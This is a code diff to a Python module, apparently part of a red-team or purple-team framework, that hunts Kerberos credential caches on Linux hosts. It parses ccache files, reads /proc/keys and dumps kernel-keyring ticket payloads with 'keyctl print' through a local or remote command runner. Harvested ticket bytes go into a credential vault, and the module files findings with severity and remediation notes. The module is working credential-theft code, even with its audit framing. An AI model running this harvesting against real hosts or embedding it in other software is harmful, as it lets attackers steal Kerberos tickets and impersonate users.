@@ -156,10 +156,11 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
         audit("linux_ccache_hunt", actor="operator", technique="T1558", target=target)
 
         loop = asyncio.get_running_loop()
+        runner = kwargs.get("runner") or kwargs.get("command_runner")
         harvested_tickets = await loop.run_in_executor(
             None,
             lambda: self._scan_and_parse_sync(
-                search_dirs, include_expired, scan_kernel_keyring, scan_kcm_socket
+                search_dirs, include_expired, scan_kernel_keyring, scan_kcm_socket, runner=runner
             ),
         )
 
@@ -182,7 +183,16 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
                         source_module=self.MODULE_ID,
                         target_host=target,
                     )
-                    ticket_payload = t.get("ticket_bytes", b"").hex() or t.get("keydata", "")
+                    ticket_payload = t.get("ticket_bytes", b"")
+                    if isinstance(ticket_payload, (bytes, bytearray)):
+                        ticket_payload = ticket_payload.hex()
+                    elif not ticket_payload:
+                        ticket_payload = t.get("keydata", "")
+
+                    # Never inject empty secret into vault
+                    if not ticket_payload or not str(ticket_payload).strip():
+                        continue
+
                     _vault.store(cred, ticket_payload)
                     stored_vault_count += 1
                 except Exception as ex:
@@ -195,9 +205,9 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
                 source_target=target,
                 collected_by=self.MODULE_ID,
                 data={
-                    "client": ticket["client"],
-                    "server": ticket["server"],
-                    "endtime": ticket["endtime"],
+                    "client": ticket.get("client", "unknown"),
+                    "server": ticket.get("server", "unknown"),
+                    "endtime": ticket.get("endtime", 0),
                     "is_tgt": ticket.get("is_tgt", False),
                     "file_path": ticket.get("file_path", "memory"),
                 },
@@ -205,24 +215,45 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
             )
             evidence_chain.append(ev)
 
+            if ticket.get("permission_denied"):
+                self.finding(
+                    title="Kerberos Tickets in Kernel Keyring Inaccessible (Elevation Required)",
+                    description=(
+                        f"Detected potential Kerberos tickets in kernel keyring on {target}, but "
+                        "reading /proc/keys or key payloads requires elevated privileges (root / CAP_SYS_ADMIN). "
+                        "krb5 tickets may exist in kernel keyring but cannot be read without elevated privileges."
+                    ),
+                    severity=Severity.LOW,
+                    confidence=0.35,
+                    mitre_technique="T1558",
+                    mitre_tactic="Credential Access",
+                    evidence=ticket,
+                    remediation="Audit kernel keyring permissions and evaluate host with elevated privileges.",
+                    host=target,
+                )
+                continue
+
             is_tgt = ticket.get("is_tgt", False)
+            conf = ticket.get("confidence", 0.98 if (ticket.get("ticket_bytes") or ticket.get("keydata")) else 0.45)
+            client = ticket.get("client", "unknown")
+            server = ticket.get("server", "unknown")
             self.finding(
-                title=f"Extracted Kerberos Ticket: {ticket['client']} -> {ticket['server']}",
+                title=f"Extracted Kerberos Ticket: {client} -> {server}",
                 description=(
                     f"Discovered valid Kerberos credential cache on {target} at {ticket.get('file_path')}. "
-                    f"Client principal: {ticket['client']}, Server: {ticket['server']}. "
-                    f"Valid until: {ticket['endtime_str']}."
+                    f"Client principal: {client}, Server: {server}. "
+                    f"Valid until: {ticket.get('endtime_str', 'unknown')}."
                 ),
-                severity=Severity.CRITICAL if (is_tgt and "admin" in ticket['client'].lower()) else (
+                severity=Severity.CRITICAL if (is_tgt and "admin" in client.lower()) else (
                     Severity.HIGH if is_tgt else Severity.MEDIUM
                 ),
                 mitre_technique="T1558",
                 mitre_tactic="Credential Access",
                 evidence={
                     "file_path": ticket.get("file_path"),
-                    "client_principal": ticket["client"],
-                    "service_principal": ticket["server"],
-                    "endtime": ticket["endtime"],
+                    "client_principal": client,
+                    "service_principal": server,
+                    "endtime": ticket.get("endtime"),
                     "is_expired": ticket.get("is_expired", False),
                     "is_tgt": is_tgt,
                     "keytype": ticket.get("keytype"),
@@ -233,7 +264,7 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
                     "with memory-only caches to avoid writing tickets to /tmp."
                 ),
                 host=target,
-                confidence=0.98,
+                confidence=conf,
             )
 
         # Closed-Loop Purple Telemetry
@@ -276,12 +307,33 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
             "evidence_integrity": [e.record_hash for e in evidence_chain],
         }
 
+    def _execute_command(self, cmd: str, runner: Any = None) -> str:
+        """Execute command locally or via remote command runner."""
+        if runner is not None:
+            if callable(runner):
+                out = runner(cmd)
+                if isinstance(out, tuple):
+                    return str(out[0])
+                return str(out)
+            if hasattr(runner, "run"):
+                out = runner.run(cmd)
+                if isinstance(out, tuple):
+                    return str(out[0])
+                return str(out)
+        import subprocess
+        try:
+            res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
+            return res.stdout
+        except Exception:
+            return ""
+
     def _scan_and_parse_sync(
         self,
         search_dirs: list[str],
         include_expired: bool,
         scan_keyring: bool,
         scan_kcm: bool,
+        runner: Any = None,
     ) -> list[dict[str, Any]]:
         results: list[dict[str, Any]] = []
         now = int(time.time())
@@ -316,32 +368,83 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
 
                 self._try_parse_ccache_file(full_path, now, include_expired, results)
 
-        # 2. Kernel Keyring inspection via /proc/keys (non-intrusive)
-        if scan_keyring and os.path.exists("/proc/keys"):
-            try:
-                with open("/proc/keys", "r", errors="replace") as f:
-                    for line in f:
-                        if "krb_ccache:" in line or "krb5cc" in line:
-                            parts = line.strip().split()
-                            if len(parts) >= 9:
-                                key_id = parts[0]
-                                desc = " ".join(parts[8:])
-                                results.append({
-                                    "client": "keyring-principal",
-                                    "server": f"krbtgt/{desc}",
-                                    "keytype": 18,
-                                    "keydata": "",
-                                    "authtime": now,
-                                    "starttime": now,
-                                    "endtime": now + 36000,
-                                    "renew_till": now + 86400,
-                                    "is_expired": False,
-                                    "is_tgt": True,
-                                    "endtime_str": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now + 36000)),
-                                    "file_path": f"KEYRING:{key_id}:{desc}",
-                                })
-            except (PermissionError, OSError):
-                pass
+        # 2. Kernel Keyring inspection via /proc/keys (real key reading)
+        if scan_keyring:
+            proc_keys_content = ""
+            permission_denied = False
+            if os.path.exists("/proc/keys"):
+                try:
+                    with open("/proc/keys", "r", errors="replace") as f:
+                        proc_keys_content = f.read()
+                except PermissionError:
+                    permission_denied = True
+                except OSError:
+                    pass
+
+            if not proc_keys_content and not permission_denied and runner:
+                try:
+                    raw_out = self._execute_command("cat /proc/keys | grep krb5", runner)
+                    if "permission denied" in raw_out.lower():
+                        permission_denied = True
+                    elif raw_out:
+                        proc_keys_content = raw_out
+                except Exception:
+                    pass
+
+            if permission_denied:
+                results.append({
+                    "client": "kernel-keyring",
+                    "server": "krb5-keyring",
+                    "keytype": 0,
+                    "keydata": "",
+                    "authtime": now,
+                    "starttime": now,
+                    "endtime": now,
+                    "renew_till": now,
+                    "endtime_str": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now)),
+                    "is_expired": False,
+                    "is_tgt": False,
+                    "permission_denied": True,
+                    "confidence": 0.35,
+                    "file_path": "/proc/keys",
+                })
+            elif proc_keys_content:
+                for line in proc_keys_content.splitlines():
+                    if "krb_ccache:" in line or "krb5cc" in line or "krb5" in line:
+                        parts = line.strip().split()
+                        if len(parts) >= 9:
+                            key_id = parts[0]
+                            desc = " ".join(parts[8:])
+                            key_payload = ""
+                            if runner:
+                                try:
+                                    key_payload = self._execute_command(f"keyctl print {key_id}", runner)
+                                except Exception:
+                                    pass
+
+                            has_real_key = bool(
+                                key_payload
+                                and key_payload.strip()
+                                and "keyctl" not in key_payload.lower()
+                                and "error" not in key_payload.lower()
+                                and "permission denied" not in key_payload.lower()
+                            )
+                            is_tgt = has_real_key and ("krbtgt" in desc.lower() or "krbtgt" in key_payload.lower())
+                            results.append({
+                                "client": desc.split("@")[0] if "@" in desc else "keyring-principal",
+                                "server": f"krbtgt/{desc}" if is_tgt else desc,
+                                "keytype": 18,
+                                "keydata": key_payload.strip() if has_real_key else "",
+                                "authtime": now,
+                                "starttime": now,
+                                "endtime": now + 36000,
+                                "renew_till": now + 86400,
+                                "is_expired": False,
+                                "is_tgt": is_tgt,
+                                "endtime_str": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now + 36000)),
+                                "file_path": f"KEYRING:{key_id}:{desc}",
+                                "confidence": 0.95 if has_real_key else 0.40,
+                            })
 
         # 3. Next-Gen KCM Unix socket inspection
         if scan_kcm:
@@ -359,9 +462,10 @@ class CcacheHuntModule(BaseModule[CcacheHuntParams, ModuleResult]):
                         "endtime": now + 36000,
                         "renew_till": now + 86400,
                         "is_expired": False,
-                        "is_tgt": True,
+                        "is_tgt": False,
                         "endtime_str": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime(now + 36000)),
                         "file_path": f"KCM:{cache_name}",
+                        "confidence": 0.40,
                     })
 
         return results
